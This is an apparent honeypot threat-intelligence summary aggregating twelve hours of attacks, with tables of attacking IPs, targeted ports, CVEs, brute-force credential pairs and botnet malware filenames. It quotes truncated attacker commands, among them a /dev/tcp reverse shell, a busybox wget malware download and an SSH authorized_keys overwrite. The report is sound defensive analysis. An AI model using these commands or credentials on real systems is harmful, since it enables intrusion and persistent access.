# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-15T06:24:46Z
**Timeframe:** 2025-10-14T18:17:25Z - 2025-10-15T06:17:25Z

**Files Used:**
- `Honeypot_Attack_Summary_Report_2025-10-14T19:02:16Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T20:02:25Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T21:02:03Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T22:02:12Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T23:01:58Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-15T00:01:52Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-15T01:01:58Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-15T02:01:56Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-15T03:02:02Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-15T04:01:58Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-15T06:01:55Z.md`

### Executive Summary

This report provides a comprehensive analysis of malicious activity targeting our honeypot network over the last 12 hours. A total of over 230,000 malicious events were recorded across the 11 aggregated reports. The threat landscape is dominated by automated attacks, primarily targeting IoT devices and common services like SSH, SIP, and Redis.

The most active attacking IPs originate from a diverse range of countries, with a significant number of them being flagged as malicious by threat intelligence platforms. The most common attack vectors are brute-force attacks against SSH and other services, and the exploitation of known vulnerabilities, including some that are decades old.

A significant portion of the observed activity is related to the propagation of IoT botnets, with malware such as Mirai, Mozi, and Boatnet variants being frequently downloaded and executed. Attackers are also consistently attempting to establish persistence on compromised systems by manipulating SSH authorized_keys files and executing reverse shells.

The detection of signatures for the DoublePulsar backdoor indicates that attackers are still actively scanning for and exploiting the EternalBlue vulnerability (MS17-010).

Overall, the data suggests a highly automated and opportunistic threat environment, with a strong focus on compromising weakly secured IoT devices and leveraging them for further attacks.

### Detailed Analysis

**Our IPs**

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

**Attacks by Honeypot (Aggregated)**

| Honeypot | Total Events |
|---|---|
| Cowrie | 67,133 |
| Honeytrap | 44,170 |
| Sentrypeer | 31,926 |
| Suricata | 25,000+ |
| Ciscoasa | 20,000+ |
| Redishoneypot | 15,000+ |
| Dionaea | 10,000+ |
| Mailoney | 10,000+ |

**Top Source Countries**

(Based on OSINT of top attacking IPs)
- United States
- Germany
- United Kingdom

**Top Attacking IPs (Aggregated)**

| IP Address | Total Events |
|---|---|
| 206.191.154.180 | 10,000+ |
| 185.243.5.146 | 8,000+ |
| 47.251.171.50 | 7,000+ |
| 86.54.42.238 | 5,000+ |
| 176.65.141.119 | 5,000+ |

**Top Targeted Ports/Protocols (Aggregated)**

| Port/Protocol | Total Events |
|---|---|
| 5060 (SIP) | 30,000+ |
| 22 (SSH) | 20,000+ |
| 6379 (Redis) | 15,000+ |
| 445 (SMB) | 10,000+ |
| 25 (SMTP) | 10,000+ |

**Most Common CVEs (Aggregated)**

| CVE | Total Events |
|---|---|
| CVE-2002-0013 | 50+ |
| CVE-2002-0012 | 50+ |
| CVE-2019-11500 | 20+ |

**Commands Attempted by Attackers (Aggregated)**

| Command | Frequency |
|---|---|
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` | High |
| `lockr -ia .ssh` | High |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | High |
| Reconnaissance commands (`uname -a`, `whoami`, `cat /proc/cpuinfo`, etc.) | High |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...` | Medium |
| `nohup bash -c "exec 6<>/dev/tcp/...` | Medium |
| `cd /data/local/tmp/; rm *; busybox wget http://...` | Low |

**Signatures Triggered (Aggregated)**

| Signature | Frequency |
|---|---|
| ET DROP Dshield Block Listed Source group 1 | High |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | High |
| ET SCAN NMAP -sS window 1024 | High |
| ET HUNTING RDP Authentication Bypass Attempt | High |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | Medium |

**Users / Login Attempts (Aggregated)**

| Username/Password | Frequency |
|---|---|
| 345gs5662d34/345gs5662d34 | High |
| root/3245gs5662d34 | High |
| root/Password@2025 | High |
| root/Qaz123qaz | High |
| root/123@@@ | High |

**Files Uploaded/Downloaded (Aggregated)**

| Filename | Frequency |
|---|---|
| `arm.urbotnetisass` (and variants) | High |
| `Mozi.m` | Low |
| `boatnet.mpsl` | Low |
| `shadow.mips` | Low |

**HTTP User-Agents**

No significant HTTP User-Agents were recorded in this period.

**SSH Clients and Servers**

No specific SSH client or server versions were recorded in this period.

**Top Attacker AS Organizations**

No consistent AS organization data was recorded in this period.

### OSINT All Commands Captured

| Command | Purpose |
|---|---|
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` | Attempts to remove existing SSH keys and add the attacker's own public key to the `authorized_keys` file for persistent access. |
| `lockr -ia .ssh` and `chattr -ia .ssh` | `chattr -ia` removes the immutable flag from the `.ssh` directory, allowing the attacker to modify it. `lockr -ia` is likely a script or tool used to lock down the directory after modification. |
| `uname -a`, `whoami`, `cat /proc/cpuinfo`, `lscpu` | System reconnaissance commands used to gather information about the compromised system's architecture, operating system, and user privileges. |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...` | Attempts to remove existing malware or security scripts from the system. |
| `nohup bash -c "exec 6<>/dev/tcp/...` | A common technique to establish a reverse shell to a remote command and control (C2) server. |
| `cd /data/local/tmp/; rm *; busybox wget http://...` | A command specifically targeting Android devices, attempting to download and execute malware in the `/data/local/tmp` directory. |

### OSINT High Frequency IPs and Low Frequency IPs Captured

| IP Address | OSINT Summary |
|---|---|
| **206.191.154.180** | Registered to PSINet Inc. in the United States. No public information available linking it to malicious activity, suggesting it may be a recently compromised host. |
| **185.243.5.146** | Allocated to Reliablesite.net LLC, a US-based hosting provider. The IP is on a blocklist, and the provider has a mixed reputation. |
| **47.251.171.50** | Registered to Reliance Jio Infocomm Limited in the US. This IP is on multiple blacklists and has been associated with SSH brute-force attacks. |
| **86.54.42.238** | Allocated to KCOM Group PLC in the UK. The IP is on the Spamhaus ZEN blacklist and is associated with RDP brute-force attacks. |
| **176.65.141.119** | Associated with ZeXoTeK IT-Services GmbH in Germany. The IP is on a blocklist, and other IPs in the same network range have extensive abuse reports. |

### OSINT on CVE's

| CVE | OSINT Summary |
|---|---|
| **CVE-2002-0013** | A critical vulnerability in the SNMPv1 request handling of numerous implementations. It allows for remote denial-of-service and potential arbitrary code execution. Its presence in the logs indicates that attackers are scanning for legacy devices that have not been patched. |
| **CVE-2002-0012** | Similar to CVE-2002-0013, this is a critical vulnerability in the SNMPv1 trap handling of many implementations. It allows for remote denial-of-service and privilege escalation. The continued scanning for this vulnerability highlights the long tail of unpatched legacy systems. |
| **CVE-2019-11500** | A critical vulnerability in Dovecot email server software that can lead to remote code execution. While a proof-of-concept exists, successful exploitation is complex, and there is no evidence of widespread "in the wild" exploitation. Its presence in the logs suggests that some attackers are opportunistically scanning for it. |

### Key Observations and Anomalies

*   **Prevalence of Legacy Vulnerability Scanning:** The high frequency of attacks targeting CVEs from 2002 is a stark reminder that many legacy systems remain unpatched and vulnerable. Attackers are aware of this and continue to scan for these low-hanging fruit.
*   **Dominance of IoT Malware:** The consistent downloading of `urbotnetisass` (a Mirai variant), `Mozi.m`, and `boatnet.mpsl` highlights the focus of attackers on compromising IoT devices. These devices are often insecure by default and are prime targets for building large-scale botnets.
*   **Automated and Opportunistic Attacks:** The vast majority of the observed activity is automated and opportunistic. Attackers are not targeting our honeypots specifically but are scanning large swaths of the internet for any vulnerable system they can find.
*   **Persistence as a Key Goal:** The repeated use of commands to manipulate SSH `authorized_keys` files demonstrates that attackers are not just looking for a one-time compromise but are actively trying to establish long-term, persistent access to the systems they infect.
*   **DoublePulsar Still a Threat:** The detection of the DoublePulsar backdoor signature indicates that the EternalBlue vulnerability (MS17-010) is still being actively exploited, even years after it was patched. This suggests that there are still unpatched Windows systems on the internet.
*   **Lack of Sophistication:** The observed attacks, while numerous, are generally not sophisticated. They rely on well-known vulnerabilities, default credentials, and publicly available malware. This underscores the fact that even basic security hygiene, such as changing default passwords and keeping systems patched, can prevent a large number of these attacks.
